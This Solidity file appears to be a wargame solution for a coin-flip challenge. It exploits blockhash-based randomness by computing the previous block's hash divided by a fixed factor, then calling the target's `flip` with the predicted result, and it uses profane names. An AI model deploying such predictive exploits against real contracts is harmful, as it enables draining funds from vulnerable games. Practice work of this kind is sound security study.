// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipInterface {
    function flip(bool _guess) external returns (bool) {}
}

contract FuckCoinFlip {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlipInterface coinFlipInstace;

    constructor(address _coinFlipAddress) {
        coinFlipInstace = CoinFlipInterface(_coinFlipAddress);
    }

    function fuck() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        if (side == true) {
            coinFlipInstace.flip(true);
        } else {
            coinFlipInstace.flip(false);
        }
    }
}
